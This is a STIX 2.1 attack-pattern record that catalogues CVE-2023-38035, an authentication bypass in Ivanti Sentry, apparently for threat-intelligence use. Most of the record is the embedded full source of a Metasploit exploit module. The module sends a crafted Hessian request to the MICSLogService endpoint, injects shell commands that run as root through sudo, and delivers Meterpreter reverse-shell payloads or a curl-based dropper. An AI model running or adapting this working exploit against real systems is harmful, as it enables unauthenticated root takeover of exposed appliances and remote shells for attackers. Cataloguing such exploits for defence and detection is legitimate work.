{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46255a58-3656-4623-86dc-0701763d7178",
    "created": "2024-08-14T17:00:57.992588Z",
    "modified": "2024-08-14T17:00:57.992592Z",
    "name": "Ivanti Sentry MICSLogService Auth Bypass resulting in RCE (CVE-2023-38035)",
    "description": " This module exploits an authentication bypass in Ivanti Sentry which exposes API functionality which allows for code execution in the context of the root user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ivanti_sentry_misc_log_service.rb",
            "external_id": "ivanti_sentry_misc_log_service.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horizon3ai/CVE-2023-38035"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-38035"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ivanti Sentry MICSLogService Auth Bypass resulting in RCE (CVE-2023-38035)',\n        'Description' => %q{\n          This module exploits an authentication bypass in Ivanti Sentry which exposes API functionality which\n          allows for code execution in the context of the root user.\n        },\n        'Author' => [\n          'Zach Hanley',    # Analysis & PoC\n          'James Horseman', # Analysis & PoC\n          'jheysel-r7'      # Msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/horizon3ai/CVE-2023-38035'],\n          [ 'URL', 'https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive/'],\n          [ 'CVE', '2023-38035']\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 8443,\n          'SSL' => true,\n          'FETCH_WRITABLE_DIR' => '/tmp'\n        },\n        'Platform' => ['unix', 'linux'],\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD, ARCH_X64 ],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => ['unix', 'linux'],\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :curl,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-08-21',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('USE_SUDO', [true, 'Execute payload as root using sudo', true]),\n        OptInt.new('SLEEP', [true, 'How long to wait for each command to run. Because the execution context does not allow for command piping or chaining the module needs to split the multi command payload by semi-colon and send each command individually', 3 ]),\n      ]\n    )\n  end\n\n  def check\n    # Unauthenticated access to the vulnerable endpoint was removed in patched versions of Sentry.\n    # Send an unsupported GET request and see if it responds politely.\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/mics/services/MICSLogService'),\n      'method' => 'GET'\n    )\n\n    return Exploit::CheckCode::Unknown('The target did not respond to the vulnerable endpoint') unless res\n    return Exploit::CheckCode::Safe(\"A vulnerable instance should respond with an HTTP 405 with the string: 'HessianServiceExporter only supports POST requests' in the response body\") unless res.code == 405 && res.body.include?('HessianServiceExporter only supports POST requests')\n\n    Exploit::CheckCode::Appears\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Below is the Hessian binary web service protocol wrapper required to invoke the function `uploadFileUsingFileInput`\n    # which allows for unauthenticated command execution in the context of the root user.\n    # More info on Hessian: http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#Headers\n\n    exploit_header = \"c\\x01\\x00m\\x00\\x18uploadFileUsingFileInputMS\\x00\\x07commandS\\x00\"\n    exploit_footer = \"S\\x00\\x06isRootTzNz\"\n\n    # The sink in this RCE is java's Runtime.getRuntime.exec(). So we must prefix our command with 'sh -c $@|sh .echo'\n    # in order to obtain full shell functionality, more info: https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html\n    cmd = \"sh -c $@|sh . echo #{cmd}\"\n    cmd = \"sudo #{cmd}\" if datastore['USE_SUDO']\n\n    vprint_status('Running the command: ' + cmd)\n\n    # Prepend the command with the length of the command as per Hessian notation\n    data = exploit_header + [cmd.length].pack('C') + cmd + exploit_footer\n    res = send_request_raw(\n      'uri' => normalize_uri(target_uri.path, '/mics/services/MICSLogService'),\n      'method' => 'POST',\n      'data' => data\n    )\n\n    fail_with(Failure::Unreachable, 'The target did not respond to the exploit attempt') unless res\n    fail_with(Failure::UnexpectedReply, \"The response from a successful exploit attempt should be a HTTP 200 with 'isRunning' in the response body.\") unless res.code == 200 && res.body.include?('isRunning')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-08-21",
    "x_mitre_platforms": [
        "linux'"
    ]
}